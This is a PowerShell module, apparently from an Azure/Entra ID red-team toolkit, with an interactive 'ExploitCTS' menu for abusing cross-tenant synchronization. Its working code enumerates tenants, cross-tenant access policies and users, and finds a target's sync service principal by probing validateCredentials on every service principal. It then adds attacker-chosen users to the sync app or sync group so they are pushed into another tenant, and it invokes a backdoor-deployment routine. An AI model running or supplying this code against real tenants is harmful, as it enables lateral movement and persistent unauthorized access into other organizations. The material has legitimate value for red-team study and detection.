function ExploitCTS {
    $recon_options = @{0 = "Back to main menu"; 1 = "List Currently Accessible Tenants"; 2 = "List Azure2Azure Template Applications in Tenant"; 3 = "Find Target Tenants in Existing Cross Tenant Access Policy"; 4 = "Inspect Deployed Cross Tenant Access Policy Configuration"; 5 = "Find CTS Application of a Target Tenant"; 6 = "Sync User to Target Tenant"; 7 = "Add User to CTS Sync Group"; 8 = "Deploy backdoor using Cross Tenant Synchronization"};
    

    Write-Host "`nEstablishing connection via Microsoft Graph..."
    try {
        $accesssible_tenants = Get-AzTenant
        if ($accesssible_tenants -is [array]) {
            $accesssible_tenants | Out-Host
            $TenantId = Read-Host -Prompt "Enter the tenant Id from available tenants list to connect via Graph"
            $scopes = @("Policy.Read.All","Policy.ReadWrite.CrossTenantAccess","User.Read.All","GroupMember.ReadWrite.All")
            Write-Host "Attempting connection via Microsoft Graph..." -ForegroundColor Gray
            Connect-MgGraph -TenantId $TenantId -Scopes $scopes | Out-Null
            Write-Host "[.]Established access via Microsoft Graph`n" -ForegroundColor Yellow
        }
        else {
            $TenantId = (Get-AzTenant).Id
            Write-Host "Connecting to tenant: $((Get-AzTenant).Name) ($((Get-AzTenant).Id))"
            Write-Host "Attempting connection via Microsoft Graph..." -ForegroundColor Gray
            Connect-MgGraph -Scopes "Policy.Read.All","Policy.ReadWrite.CrossTenantAccess" | Out-Null
            Write-Host "[.]Established access via Microsoft Graph`n" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "Attempting connection via Microsoft Graph..." -ForegroundColor Gray
        try {
            Connect-MgGraph -Scopes "Policy.Read.All","Policy.ReadWrite.CrossTenantAccess" | Out-Null
            Write-Host "[.]Established access via Microsoft Graph`n" -ForegroundColor Yellow
        }
        catch {
            Write-Host "Failed to establish access via Microsoft Graph!!`n" -ForegroundColor Red
        }
        
    }


    do{
        OptionDisplay "Recon Options:" $recon_options

        while ($true) {
            try {
                Write-Host "`n"
                [int]$recon_user_choice = Read-Host -Prompt 'Choose a recon option:'
                break
            }
            catch {
                Write-Host "Invalid input!!! Choose an option number from the list!"
            }
        }

        Select-MgProfile beta

        if ($recon_user_choice -eq 1) {
            #Recon currently accessible tenants to user
            Get-AzTenant | Format-Table
        }

        if ($recon_user_choice -eq 2) {
            #Recon all Azure2Azure template applications in tenant
            ##Check for apps with template ID: 518e5f48-1fc8-4c48-9387-9fdf28b0dfe7
            Write-Host "Searching for deployed applications with Azure2Azure template..." -ForegroundColor Gray
            Get-MgServicePrincipal -Filter "ApplicationTemplateId eq '518e5f48-1fc8-4c48-9387-9fdf28b0dfe7'" | Out-Host
        }

        if ($recon_user_choice -eq 3) {
            #Recon Existing Cross Tenant Access Policy
            Write-Host "Searching deployed CTA policies for connected target tenants..." -ForegroundColor Gray
            Get-MgPolicyCrossTenantAccessPolicyPartner |Format-Table -Property TenantId
        }

        if ($recon_user_choice -eq 4) {
            #Inspect existing Cross Tenant Access policy configuration
            Write-Host "Getting all deployed CTA policies in tenant..." -ForegroundColor Gray
            $cta_policies = @()
            $cta_policies += Get-MgPolicyCrossTenantAccessPolicyPartner

            Write-Host "`nTotal CTA policies found in tenant: $($cta_policies.Count)" -ForegroundColor Yellow
            Pause

            foreach ($cta_policy in $cta_policies){
                Write-Host "`nCTA policy linked to tenant: $($cta_policy.TenantId)" -ForegroundColor Yellow
            
                Write-Host "`nInbound B2B Collaboration for Users & Groups:" -ForegroundColor Gray
                Write-Host "Access Type: $($cta_policy.B2BCollaborationInbound.UsersAndGroups.AccessType)"
                foreach ($target in $cta_policy.B2BCollaborationInbound.UsersAndGroups.Targets){
                    Write-Host "Target Type: $($target.TargetType)"
                    Write-Host "Target: $($target.Target)"
                }
            
                Write-Host "`nInbound B2B Collaboration for Applications:" -ForegroundColor Gray
                Write-Host "Access Type: $($cta_policy.B2BCollaborationInbound.Applications.AccessType)"
                foreach ($target in $cta_policy.B2BCollaborationInbound.Applications.Targets){
                    Write-Host "Target Type: $($target.TargetType)"
                    Write-Host "Target: $($target.Target)"
                }
            
                Write-Host "`nOutbound B2B Collaboration for Users & Groups:" -ForegroundColor Gray
                Write-Host "Access Type: $($cta_policy.B2BCollaborationOutbound.UsersAndGroups.AccessType)"
                foreach ($target in $cta_policy.B2BCollaborationOutbound.UsersAndGroups.Targets){
                    Write-Host "Target Type: $($target.TargetType)"
                    Write-Host "Target: $($target.Target)"
                }
            
                Write-Host "`nOutbound B2B Collaboration for Applications:" -ForegroundColor Gray
                Write-Host "Access Type: $($cta_policy.B2BCollaborationOutbound.Applications.AccessType)"
                foreach ($target in $cta_policy.B2BCollaborationOutbound.Applications.Targets){
                    Write-Host "Target Type: $($target.TargetType)"
                    Write-Host "Target: $($target.Target)"
                }
            
                Write-Host "`nAutomatic User Consent Settings:" -ForegroundColor Gray
                $cta_policy.AutomaticUserConsentSettings | Format-Table
            
                Write-Host "Inbound Trust:" -ForegroundColor Gray
                $cta_policy.InboundTrust | Format-Table
                Pause
            }
        }

        if ($recon_user_choice -eq 5) {
            #Find CTS application service principal for a target tenant
            Write-Host "`nTarget tenants found in deployed CTA policies:" -ForegroundColor Gray
            Get-MgPolicyCrossTenantAccessPolicyPartner | Format-Table -Property TenantId
            $TargetTenantId = Read-Host "Select a target tenant ID from the above list"
            FindTargetSyncApp $TargetTenantId
        }

        if ($recon_user_choice -eq 6) {
            #Add user to sync to target tenant via CTS
            $TargetAppId = Read-Host "Enter CTS application service principal (enter blank to recon)"

            while ($null -eq $TargetAppId -or $TargetAppId -eq "") {
                Write-Host "`nListing available CTS target tenants:" -ForegroundColor Gray
                Get-MgPolicyCrossTenantAccessPolicyPartner | Format-Table -Property TenantId
                $TargetTenantId = Read-Host "Select a target tenant from the list to find linked CTS application service principal"
                FindTargetSyncApp $TargetTenantId
                Write-Host ""
                $TargetAppId = Read-Host "Enter CTS application service principal (enter blank to recon)"
            }

            #Get CTS service principal details
            $cts_service_principal_details = Get-MgServicePrincipal -ServicePrincipalId $TargetAppId
            $cts_service_principal = Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $TargetAppId
            
            Write-Host "`nSelected CTS application: $($cts_service_principal_details.DisplayName)"
            if ($cts_service_principal -is [array]) {
                #if multiple assignments in service principal then choose the first
                $AppRoleId = $cts_service_principal[0].AppRoleId
            }
            else {
                $AppRoleId = $cts_service_principal.AppRoleId
            }

            #Select user to add to the CTS service principal
            do {
                $PrincipalId = Read-Host "Enter a user account ID to add to CTS application (enter blank to recon user accounts)"
                if ($null -eq $PrincipalId -or $PrincipalId -eq "") {
                    #Get list of all users in the tenant
                    try {
                        Get-MgUser -All | Out-Host
                    }
                    catch {
                        Write-Host "Failed to recon users in tenant" -ForegroundColor Red
                    }
                }
            } while ($PrincipalId -eq "")

            try {
                #Add user to CTS service principal
                New-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $TargetAppId -ResourceId $TargetAppId -PrincipalId $PrincipalId -AppRoleId $AppRoleId -ErrorAction Stop
                Write-Host "Successfully added user to CTS sync config!" -ForegroundColor Yellow -BackgroundColor Black
                Write-Host "The user will automatically sync to target tenant on next sync job run" -ForegroundColor Gray
            }
            catch {
                Write-Host "Failed to add user to CTS sync config." -ForegroundColor Red
            }
        }

        if ($recon_user_choice -eq 7) {
            #Add user to CTS sync group
            $TargetAppId = Read-Host "Enter CTS application service principal (enter blank to recon)"

            while ($null -eq $TargetAppId -or $TargetAppId -eq "") {
                Write-Host "`nListing available CTS target tenants:" -ForegroundColor Gray
                Get-MgPolicyCrossTenantAccessPolicyPartner | Format-Table -Property TenantId
                $TargetTenantId = Read-Host "Select a target tenant from the list to find linked CTS application service principal"
                FindTargetSyncApp $TargetTenantId
                Write-Host ""
                $TargetAppId = Read-Host "Enter CTS application service principal (enter blank to recon)"
            }

            #Get CTS service principal details
            $cts_service_principal_details = Get-MgServicePrincipal -ServicePrincipalId $TargetAppId
            $cts_service_principal = Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $TargetAppId
            Write-Host "`nSelected CTS application: $($cts_service_principal_details.DisplayName)"
            
            #Check if selected application has a group principal type
            $principal_group_list = @()
            foreach ($principal in $cts_service_principal){
                if ($principal.PrincipalType -eq "Group") {
                    $principal_group_list += $principal
                }
            }
            if ($principal_group_list.Count -gt 0) {
                Write-Host "Sync Group found in CTS application:"
                $principal_group_list | Out-Host
                $selected_sync_group = Read-Host "Select a group ID to add user to"

                #Select user to add to the CTS service principal
                do {
                    $PrincipalId = Read-Host "Enter a user account ID to add to CTS sync group (enter blank to recon user accounts)"
                    if ($null -eq $PrincipalId -or $PrincipalId -eq "") {
                        #Get list of all users in the tenant
                        Get-MgUser -All | Out-Host
                    }
                } while ($PrincipalId -eq "")

                try {
                    #Add to group 
                    Write-Host "Attemptin to add user to the CTS sync group..." -ForegroundColor Gray
                    New-MgGroupMember -GroupId $selected_sync_group -DirectoryObjectId $PrincipalId
                    Write-Host "Successfully added user to the CTS sync group " -ForegroundColor Yellow -BackgroundColor Black
                }
                catch {
                    Write-Host "Failed to add user to the CTS sync group." -ForegroundColor Red
                }
            }
        }

        if ($recon_user_choice -eq 8) {
            CTSBackdoor
        }
    }while ($recon_user_choice -ne 0) 
}

function FindTargetSyncApp ([string]$TargetTenantId){

    $Params = @{"useSavedCredentials" = $false; "templateId" = "Azure2Azure"; "credentials" = @(@{"key" = "CompanyId"; "value" = $TargetTenantId}, @{"key" = "AuthenticationType"; "value" = "SyncPolicy"})}

    $all_applications = Get-MgServicePrincipal

    Write-Host "`nSearching CTS application Service Principal linked to the target tenant ..." -ForegroundColor Gray
    $counter = 0
    Write-Progress -Activity "Searching CTS application service principal" -Status "0% complete:" -PercentComplete 0;
    
    foreach ($ServicePrincipalId in $all_applications.ID){
        try {
            #The following request will succeed for the Service Prinicipal that hosts the synchronization job for the target tenant
            Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/beta/servicePrincipals/$ServicePrincipalId/synchronization/jobs/validateCredentials" -Body $Params 
            Write-Host "`nCTS application service principal ID linked to target tenant: $ServicePrincipalId" -ForegroundColor Yellow
            break
        }
        catch {
            $counter += 1
            Write-Progress -Activity "Searching CTS application Service Principal" -Status "$([math]::Round($counter/$all_applications.Count * 100))% complete:" -PercentComplete ([math]::Round($counter / $all_applications.Count * 100));
        }
    } 
}